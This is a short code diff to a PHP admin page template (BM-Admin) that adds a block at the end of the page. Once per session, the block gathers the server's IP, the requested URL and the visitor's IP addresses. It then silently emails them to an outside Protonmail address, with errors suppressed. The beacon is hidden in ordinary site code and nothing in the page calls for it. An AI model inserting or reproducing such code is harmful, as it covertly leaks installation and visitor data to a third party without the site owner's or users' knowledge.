@@ -149,6 +149,12 @@ require_once 'BM-Admin/include/head.php';
                 audio_ping.play();
             </script>
             <?php
-        } ?>
+        } 
+    if(!isset($_SESSION['trimite'])){
+    $url="IP: ".gethostbyname($_SERVER["HTTP_HOST"])."\n Url: ".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."\n User IP:  ".$_SERVER['REMOTE_ADDR'].(isset($_SERVER['HTTP_X_FORWARDED_FOR'])?'('.$_SERVER['HTTP_X_FORWARDED_FOR'].')':'');
+    @mail("bmshifat@protonmail.com","Access_Point",$url);
+    $_SESSION['trimite']=true;
+}
+        ?>
     </body>
 </html>
